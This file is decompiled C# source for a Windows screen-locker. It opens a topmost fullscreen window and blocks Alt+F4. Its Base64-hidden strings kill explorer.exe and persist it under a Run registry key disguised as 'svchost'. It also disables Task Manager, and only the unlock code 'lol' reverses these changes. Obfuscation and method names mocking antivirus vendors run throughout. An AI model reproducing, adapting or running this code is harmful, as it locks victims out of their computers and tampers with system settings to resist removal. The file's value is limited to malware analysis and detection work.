using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ariec;

public class ariapalach : Form
{
	private IContainer icontainer_0 = null;

	private TextBox code;

	private Button IFFER;

	private Label label1;

	private Label label2;

	public ariapalach()
	{
		if (144454 > Screen.get_PrimaryScreen().get_Bounds().Height + Screen.get_PrimaryScreen().get_Bounds().Width)
		{
			InitializeComponent();
			((Form)this).set_KeyPreview(true);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(ariapalach));
		code = new TextBox();
		IFFER = new Button();
		label1 = new Label();
		label2 = new Label();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(code, "code");
		((TextBoxBase)code).set_BorderStyle((BorderStyle)1);
		((Control)code).set_Name("code");
		componentResourceManager.ApplyResources(IFFER, "IFFER");
		((Control)IFFER).set_BackColor(SystemColors.AppWorkspace);
		((Control)IFFER).set_Name("IFFER");
		((ButtonBase)IFFER).set_UseVisualStyleBackColor(false);
		((Control)IFFER).add_Click((EventHandler)IFFER_Click);
		componentResourceManager.ApplyResources(label1, "label1");
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_ForeColor(SystemColors.ControlText);
		((Control)label1).set_Name("label1");
		((Control)label1).add_Click((EventHandler)label1_Click);
		componentResourceManager.ApplyResources(label2, "label2");
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Name("label2");
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Form)this).set_AcceptButton((IButtonControl)(object)IFFER);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)IFFER);
		((Control)this).get_Controls().Add((Control)(object)code);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_KeyPreview(true);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("ariapalach");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)ariapalach_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	protected override void OnKeyDown(KeyEventArgs keyEventArgs_0)
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Invalid comparison between Unknown and I4
		if (10654 > Screen.get_PrimaryScreen().get_Bounds().Height + Screen.get_PrimaryScreen().get_Bounds().Width)
		{
			((Control)this).OnKeyDown(keyEventArgs_0);
			if ((int)keyEventArgs_0.get_KeyCode() == 115 && keyEventArgs_0.get_Alt())
			{
				keyEventArgs_0.set_Handled(true);
			}
		}
	}

	public static string kasperskiyidiottupoy(string data)
	{
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(data);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[charCount];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			return new string(array2);
		}
		catch (Exception ex)
		{
			throw new Exception("Error in base64Decode" + ex.Message);
		}
	}

	public static string drwebinodsosutbolshoychlen(int int_0)
	{
		string result = "";
		if (int_0 == 1)
		{
			result = kasperskiyidiottupoy("c3ZuaG9zdA==");
		}
		if (int_0 == 2)
		{
			result = kasperskiyidiottupoy("ZmdyZWVmbg==");
		}
		if (int_0 == 3)
		{
			result = kasperskiyidiottupoy("U29mdHdhcmVcXE1pY3Jvc29mdFxc");
		}
		if (int_0 == 4)
		{
			result = kasperskiyidiottupoy("XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFw=");
		}
		if (int_0 == 5)
		{
			result = kasperskiyidiottupoy("dGFza2tpbGw=");
		}
		if (int_0 == 6)
		{
			result = kasperskiyidiottupoy("Y21kLmV4ZQ==");
		}
		if (int_0 == 7)
		{
			result = kasperskiyidiottupoy("L0Mg");
		}
		if (int_0 == 8)
		{
			result = kasperskiyidiottupoy("IC9mIC9pbSBleHBsb3Jlci5leGU=");
		}
		return result;
	}

	public static void pervayapalka()
	{
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		string name = drwebinodsosutbolshoychlen(1);
		if (!(Control.get_DefaultBackColor().ToString() != drwebinodsosutbolshoychlen(2)))
		{
			return;
		}
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(drwebinodsosutbolshoychlen(3) + drwebinodsosutbolshoychlen(4));
		try
		{
			registryKey.SetValue(name, executablePath);
			registryKey.Close();
		}
		catch
		{
			if (Control.get_DefaultBackColor().ToString() == drwebinodsosutbolshoychlen(2))
			{
				MessageBox.Show("Error");
			}
		}
	}

	public static void mvssosetzalupu()
	{
		string text = drwebinodsosutbolshoychlen(5);
		if (Screen.get_PrimaryScreen().get_Bounds().Width > 1)
		{
			Process.Start(drwebinodsosutbolshoychlen(6), drwebinodsosutbolshoychlen(7) + text + drwebinodsosutbolshoychlen(8));
		}
	}

	public static void alanliytrahmvs()
	{
		Application.Exit();
	}

	public static void refactor()
	{
		string value = "1";
		string text = "Software\\Microsoft\\Win";
		string subkey = text + "dows\\CurrentVersion\\Policies\\System";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
			registryKey.SetValue("DisableTaskMgr", value);
			registryKey.Close();
		}
		catch (Exception)
		{
			if (34 > Screen.get_PrimaryScreen().get_Bounds().Width)
			{
				alanliytrahmvs();
			}
		}
	}

	public static void eef3e()
	{
	}

	private void ariapalach_Load(object sender, EventArgs e)
	{
		Thread.Sleep(60);
		if (Screen.get_PrimaryScreen().get_Bounds().Width > 350)
		{
			((Form)this).set_TopMost(true);
			((Form)this).set_WindowState((FormWindowState)2);
			((Control)this).set_Width(Screen.get_PrimaryScreen().get_Bounds().Width);
			((Control)this).set_Height(Screen.get_PrimaryScreen().get_Bounds().Height);
			if (38 < Screen.get_PrimaryScreen().get_Bounds().Width)
			{
				mvssosetzalupu();
				int num = 0;
				for (num = 0; num < 255; num++)
				{
				}
			}
		}
		pervayapalka();
		Application.DoEvents();
		refactor();
		Application.DoEvents();
	}

	private void IFFER_Click(object sender, EventArgs e)
	{
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)code).get_Text() == "lol")
		{
			Process.Start("C:\\Windows\\explorer.exe");
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
			try
			{
				string text = "nho";
				registryKey.DeleteValue("sv" + text + "st");
				registryKey.Close();
			}
			catch
			{
			}
			string text2 = "ftware";
			int num = 5;
			string subkey = "So" + text2 + "\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(subkey);
				registryKey2.SetValue("DisableTaskMgr", (num - 5).ToString());
				registryKey2.Close();
			}
			catch (Exception)
			{
			}
			alanliytrahmvs();
		}
		else if (10653 > Screen.get_PrimaryScreen().get_Bounds().Height + Screen.get_PrimaryScreen().get_Bounds().Width + 10)
		{
			string text3 = "евірн";
			string text4 = "ва";
			MessageBox.Show("Н" + text3 + "ий код!", "У" + text4 + "га!");
		}
	}

	private void label1_Click(object sender, EventArgs e)
	{
		if (67 > Screen.get_PrimaryScreen().get_Bounds().Height)
		{
			Application.Exit();
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
		refactor();
		Application.DoEvents();
	}
}
